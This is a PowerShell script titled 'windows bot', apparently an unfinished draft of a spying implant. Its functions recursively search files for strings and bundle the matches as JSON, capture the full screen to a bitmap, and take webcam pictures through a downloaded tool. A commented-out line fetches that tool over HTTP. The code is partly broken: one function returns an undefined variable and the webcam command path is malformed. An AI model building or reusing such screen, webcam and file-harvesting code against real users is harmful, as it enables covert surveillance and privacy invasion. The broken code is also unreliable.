# windows bot 

function create_json($json_object, $input_object) {
	#$input_json = $input_object
	$json_object += $input_object | convertto-json #convertto-json -inputobject $input_object
	
	return $json_object #| convertto-json
}

# Name: 		find_string
# Parameters: 	$string (value to search)
# Return value:	returns an object containing the list of files
# Purpose: 		find all files containing a given string
function find_string ($string){
	$string_a ="this is a super hard test"
	$file1 = Get-ChildItem -recurse | select-string -pattern $string_a | convertto-json
	$string_b = "another etest yo"
	$file2 = get-ChildItem -recurse | select-string -pattern $string_b | convertto-json
	
	#write-host "[+] file 1:"
	#write-host $file1
	#write-host "[+] file 2:"
	#write-host $file2
	#$obj = create_json $obj, $file1 #| convertto-json
	#$obj_ = create_json $obj, $file2 #| convertto-json
	#$dog = convertto-json $obj
	#write-host ""
	#$json_object = convertto-json -inputobject $file1
	#$json_object += convertto-json -inputobject $file2
	$magic = ""
	$obj_ = create_json $magic, $file1
	$obj_ = create_json $obj_, $file2
	write-host "[+] json object: "
	write-host $obj_ #|convertto-json #$dog #$obj #|convertto-json
		
	#$obj_a = convertfrom-json -inputobject $files 
	#$obj_a | add-member $file2
	#write-host "maaaagic---------------"
	#write-host $obj_a | convertto-json
	
	return $files
}
find_string "magic"

# Name:			take_screenshot
# Parameters:	None
# Return value:	$file (path to screenshot on local system)
# Purpose:		takes a screenshot and saves it in the format screenshot_yyyy-mm-dd_H_M_s.
function take_screenshot {
	$file = "C:\Users\whatbatman\screenshot_$(get-date -format yyyy-mm-dd_H_M_s).bmp"

	# get the dimensions of the screen 
	$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
	$width = $screen.Width
	$height = $screen.Height
	$left = $screen.Left
	$top = $screen.Top
	
	# create the bitmap to store the screenshot
	$bitmap = New-Object System.Drawing.Bitmap $width, $height
	$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
	$graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
	$bitmap.Save($file)
	
	return $file
}

# Name:			webcam_capture
# Parameters:	None
# Return:		$file (path to image on local system)
# Purpose:		takes a picture with the webcam. This requires an additional too we will pull down first use
function webcam_capture {
	# If we don't have the application required to screenshot, go get it. Then run it.
	# If we already have it then this test will pass and will just run it.
	#if (-not Test-Path 'C:\Program Files\CommandCam.exe'){
#		wget http://localhost/CommandCam.exe
	#}
	
	$date = Get-Date -format yyyy-mm-dd_H_M_s
	
	.C:\Program Files\CommandCam.exe /filename .pics$date.bmp
	
	return ".pics$date.bmp"
}


